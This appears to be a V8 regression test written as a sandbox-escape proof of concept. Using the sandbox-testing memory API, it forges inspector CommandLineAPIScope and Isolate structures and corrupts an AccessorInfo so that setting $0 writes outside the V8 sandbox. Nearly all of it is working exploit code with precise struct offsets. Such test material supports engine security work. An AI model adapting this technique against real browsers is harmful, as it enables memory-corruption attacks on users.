// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --enable-inspector --sandbox-testing

globalThis.receive = function(message) {
  print(message);
};

const expression = String.raw`
const print = (...args) => console.log(...args);
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function r32(addr) {
  return mem.getUint32(addr >>> 0, true);
}

function w32(addr, value) {
  mem.setUint32(addr >>> 0, value >>> 0, true);
}

function w64(addr, value) {
  mem.setBigUint64(addr >>> 0, BigInt(value), true);
}

function raw(obj) {
  return Sandbox.getAddressOf(obj) >>> 0;
}

function hex32(value) {
  return "0x" + (value >>> 0).toString(16);
}

function hex64(value) {
  return "0x" + BigInt(value).toString(16);
}

function full(offset) {
  return BigInt(Sandbox.base) + BigInt(offset >>> 0);
}

function objectFromTagged(tagged) {
  return Sandbox.getObjectAt(((tagged >>> 0) - 1) >>> 0);
}

function offsetFromTagged(tagged) {
  return ((tagged >>> 0) - 1) >>> 0;
}

function typeOfTagged(tagged) {
  return Sandbox.getInstanceTypeOfObjectAt(offsetFromTagged(tagged));
}

function sizeOfTagged(tagged) {
  return Sandbox.getSizeOfObjectAt(offsetFromTagged(tagged));
}

function isTaggedHeapObject(tagged) {
  return (tagged & 1) === 1 &&
      tagged !== 0x11 &&
      Sandbox.isValidObjectAt(offsetFromTagged(tagged));
}

const kFixedArrayLengthShift = (() => {
  const probe = [{}];
  const probeBase = raw(probe);
  for (let off = 0; off < 32; off += 4) {
    const tagged = r32(probeBase + off);
    if (!isTaggedHeapObject(tagged)) continue;
    if (typeOfTagged(tagged) !== "FIXED_ARRAY_TYPE") continue;
    const rawLength = r32(offsetFromTagged(tagged) + 4);
    if (rawLength === 1 || rawLength === 2) return rawLength === 2 ? 1 : 0;
  }
  throw new Error("could not infer FixedArray length encoding");
})();

function fixedArrayLength(base) {
  return r32(base + 4) >>> kFixedArrayLengthShift;
}

function findGlobalObjectOffset() {
  const globalProxyMap = (r32(raw(globalThis)) - 1) >>> 0;
  return offsetFromTagged(r32(globalProxyMap + 16));
}

function findCommandLineAccessorInfo(name) {
  const globalObject = findGlobalObjectOffset();
  const dictionaryTagged = r32(globalObject + 4);
  const dictionary = objectFromTagged(dictionaryTagged);
  const base = offsetFromTagged(dictionaryTagged);
  const size = sizeOfTagged(dictionaryTagged);

  for (let off = 0; off < size; off += 4) {
    const cellTagged = r32(base + off);
    if (!isTaggedHeapObject(cellTagged)) continue;

    if (typeOfTagged(cellTagged) !== "PROPERTY_CELL_TYPE") continue;
    const cellBase = offsetFromTagged(cellTagged);
    const nameTagged = r32(cellBase + 4);
    const valueTagged = r32(cellBase + 12);
    if (!isTaggedHeapObject(nameTagged) || !isTaggedHeapObject(valueTagged)) {
      continue;
    }

    const keyType = typeOfTagged(nameTagged);
    if (!keyType.includes("STRING")) continue;
    const key = objectFromTagged(nameTagged);
    if (String(key) !== name) continue;

    const valueType = typeOfTagged(valueTagged);
    if (valueType !== "ACCESSOR_INFO_TYPE") {
      throw new Error(name + " did not resolve to AccessorInfo: " + valueType);
    }
    return {accessorInfo: offsetFromTagged(valueTagged), nameTagged, key};
  }

  throw new Error("could not find command-line API accessor " + name);
}

function findArrayElements(jsArray, predicate) {
  const base = raw(jsArray);
  for (let off = 0; off < 32; off += 4) {
    const tagged = r32(base + off);
    if (!isTaggedHeapObject(tagged)) continue;
    if (typeOfTagged(tagged) !== "FIXED_ARRAY_TYPE") continue;
    const objBase = offsetFromTagged(tagged);
    const length = fixedArrayLength(objBase);
    const first = length > 0 ? r32(objBase + 8) : 0;
    if (!predicate || predicate({tagged, offset: objBase, off, length, first})) {
      return {tagged, offset: objBase, off, length, first};
    }
  }
  throw new Error("could not find JSArray elements");
}

function chooseUnmappedTarget() {
  const sandboxBase = BigInt(Sandbox.base);
  const sandboxEnd = sandboxBase + BigInt(Sandbox.byteLength);
  const candidates = [
    0x414141410000n,
    0x515151510000n,
    0x626262620000n,
    0x6d6d6d6d0000n,
  ];

  for (const candidate of candidates) {
    if (candidate >= sandboxBase && candidate < sandboxEnd) continue;
    return candidate;
  }
  throw new Error("could not choose an out-of-sandbox target");
}

const {accessorInfo, nameTagged, key} = findCommandLineAccessorInfo("$0");

// Real FixedArray ["$0"] used by accessorSetterCallback's installed-methods
// loop. The first element must StrictEquals the accessor name.
const methodsCarrier = [key];
const methodsElements = findArrayElements(
    methodsCarrier, ({length, first}) => length > 0 && first === nameTagged);

// A large in-sandbox FixedArray gives us stable writable bytes for fake C++
// objects and fake native handle slots.
const holder = {};
const arenaCarrier = new Array(512).fill(holder);
const arenaElements = findArrayElements(
    arenaCarrier, ({length}) => length >= 512);
const arena = (arenaElements.offset + 8) >>> 0;

const fakeScope = arena;
const fakeIsolate = (arena + 0x100) >>> 0;
const methodsGlobalSlot = (arena + 0x380) >>> 0;
const fakeData = new ArrayBuffer(8);
const target = chooseUnmappedTarget();

// A v8::Global<T> stores a native pointer to a slot containing the full tagged
// object address. Put a fake persistent slot inside sandbox memory.
w64(methodsGlobalSlot, full(methodsElements.tagged));

// CommandLineAPIScope layout on this x64 build:
//   +0x00 v8::Isolate* m_isolate
//   +0x08 Global<Context> m_context
//   +0x10 Global<Object> m_commandLineAPI
//   +0x18 Global<Object> m_global
//   +0x20 Global<PrimitiveArray> m_installedMethods
//   +0x28 Global<ArrayBuffer> m_thisReference
w64(fakeScope + 0x00, full(fakeIsolate));
w64(fakeScope + 0x20, full(methodsGlobalSlot));

// Isolate::isolate_data_.handle_scope_data_ offsets in this x64 release build:
//   +0x230 Address* next
//   +0x238 Address* limit
//
// Local handle creation will read next/limit from the fake isolate, update
// next in sandbox memory, then perform *next = value at the out-of-sandbox
// target below. This makes the crash a real write violation.
w64(fakeIsolate + 0x230, target);
w64(fakeIsolate + 0x238, target + 0x100n);

new DataView(fakeData).setBigUint64(0, full(fakeScope), true);

print("accessorInfo=" + hex32(accessorInfo));
print("nameTagged=" + hex32(nameTagged));
print("methodsElements=" + hex32(methodsElements.offset) +
      " length=" + methodsElements.length);
print("arena=" + hex32(arena));
print("fakeScope=" + hex64(full(fakeScope)));
print("fakeIsolate=" + hex64(full(fakeIsolate)));
print("target=" + hex64(target));

// AccessorInfo layout in this pointer-compressed build:
//   +0 map
//   +4 data
//   +8 name
//   +12 getter external-pointer handle
//   +16 setter external-pointer handle
//   +20 flags
w32(accessorInfo + 4, (raw(fakeData) + 1) >>> 0);

// Trigger V8Console::CommandLineAPIScope::accessorSetterCallback. The forged
// scope survives through installedMethods(), then Local::New creates an API
// handle through the forged isolate's HandleScopeData and writes to target.
globalThis.$0 = 13;
`;

send(JSON.stringify({
  id: 1,
  method: 'Runtime.evaluate',
  params: {
    includeCommandLineAPI: true,
    expression,
  },
}));
